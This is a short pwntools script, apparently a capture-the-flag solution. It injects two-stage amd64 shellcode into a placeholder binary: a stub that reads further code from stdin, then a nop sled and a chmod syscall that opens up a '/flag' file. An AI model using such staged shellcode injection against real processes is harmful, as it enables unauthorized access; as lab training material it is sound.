from pwn import *

context.arch = 'amd64'


# Store a process to interact with it.
p = process("BINARY_FILE")

stage_1 = asm("""
    # Get rax's value by living off tha land.
    xor edi, edi  # fd = stdin = 0
    push rdx
    pop rsi       # Get rsi's value by living off the land.
    syscall       # read()
""")

stage_2 = asm("""

    nop
    nop
    nop
    nop
    nop
    nop
    nop

    mov rax, 90
    mov rcx, 0x0067616c662f2f2f
    push rcx
    push rsp
    pop rdi
    mov rsi, 0x1ff
    syscall
""")

print(len(stage_1))
print(len(stage_2))

# Inject our payload into the process.
p.send(stage_1)
p.send(stage_2)

p.interactive()
